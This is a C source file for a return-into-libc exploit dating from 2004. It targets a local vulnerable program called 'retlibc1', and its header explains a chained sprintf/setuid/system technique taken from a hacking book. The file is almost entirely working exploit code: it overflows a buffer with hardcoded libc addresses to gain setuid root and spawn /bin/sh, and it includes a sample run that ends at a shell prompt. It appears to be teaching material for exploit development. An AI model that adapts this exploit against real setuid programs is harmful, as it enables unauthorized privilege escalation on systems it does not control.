/*
 * $Id: retlibc1-ex10.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex10.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit applies the sprintf() technique to write multiple words with
 * a single call with chained return-into-libc (nothing but libc calls!). The
 * sprintf() function works just like printf(), but it outputs to a string
 * designated by its first argument. This can be used to write 2 words with a
 * single call, which will be necessary for 3 calls to chain properly.
 *
 * We need to build a chain like:
 * [&sprintf()] [&setuid()] [&here] ["%2$nXXXX" addr] ["/bin/sh" addr] [&fs]
 *
 * XXXX = system() address in libc
 * &fs = address of the format string pointer
 *
 * The sprintf() call will happen first, parsing the format string to write 
 * 4 bytes of nulls over the address of the format string itself. Then the
 * rest of the string, containing the address of system(), is written to the
 * address of the first argument, which overwrites itself. 
 *
 * After the sprintf() call, the middle 2 words will be overwritten:
 * [&sprintf()] [&setuid()] [&system()] [0x00000000] ["/bin/sh" addr] [&fs]
 *
 * Then, the execution will return to the setuid() function. This will execute 
 * using the newly written null word as its argument, (hopefully) setting root 
 * privileges and finally returning into the newly written address for the
 * system() function, which will execute the shell.
 *
 * This interesting technique is explained by Jon Erickson <matrix@phiral.com>
 * in his book "Hacking: the art of exploitation".
 *
 * $ uname -a
 * Linux karma 2.4.18-1-686-smp #1 SMP Mon Jan 5 20:42:23 UTC 2004 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./retlibc1-ex10
 * Using sprintf() address : 0x4006d3e8
 * Using setuid() address  : 0x400bb790
 * Using system() address  : 0x4005f590
 * Using '/bin/sh' address : 0x4012276d
 * Using _null address     : 0xbffffdcc	# _NULL = &buf + (65 * 4) + (3 * 4)
 * Using _system address   : 0xbffffdc8 # _SYSTEM = &buf + (65 * 4) + (2 * 4)
 * Using fs address        : 0xbfffffe8
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./retlibc1"	// the vulnerable program
#define BUF	284 + 1		// (65 * 4) + (6 * 4) + 1
#define SPRINTF	0x4006d3e8	// sprintf() address in libc
#define	SETUID	0x400bb790	// setuid() address in libc
#define SYSTEM	0x4005f590	// system() address in libc
#define SHELL	0x4012276d	// "/bin/sh" address in libc
#define	_NULL	0xbffffdcc	// address where to put nulls
#define	_SYSTEM	0xbffffdc8	// address where to put &system()
#define	FS	"%2$n"		// format string for sprintf()

int main(int argc, char **argv)
{
	char	buf[BUF], fs[8 + 1];
	int	*p = (int *)fs;

	char	*env[2];
	int	fs_addr;

	/* build the format string */
	*p++ = *((int *)FS);
	*p++ = SYSTEM;
	*p = 0x0;

	/* prepare the environment */
	env[0] = fs;
	env[1] = NULL;
	fs_addr = 0xbffffffa - strlen(fs) - strlen(VULN);

	/* fill the first part of the buffer */
	p = (int *)buf;
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = SPRINTF;
	*p++ = SETUID;
	*p++ = _SYSTEM;
	*p++ = fs_addr;
	*p++ = SHELL;
	*p++ = _NULL;
	*p = 0x0;

	/* print some output */
	fprintf(stderr, "Using sprintf() address\t: %p\n", SPRINTF);
	fprintf(stderr, "Using setuid() address\t: %p\n", SETUID);
	fprintf(stderr, "Using system() address\t: %p\n", SYSTEM);
	fprintf(stderr, "Using '/bin/sh' address\t: %p\n", SHELL);
	fprintf(stderr, "Using _null address\t: %p\n", _NULL);
	fprintf(stderr, "Using _system address\t: %p\n", _SYSTEM);
	fprintf(stderr, "Using fs address\t: %p\n", fs_addr);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, env);
	perror("execle");
}
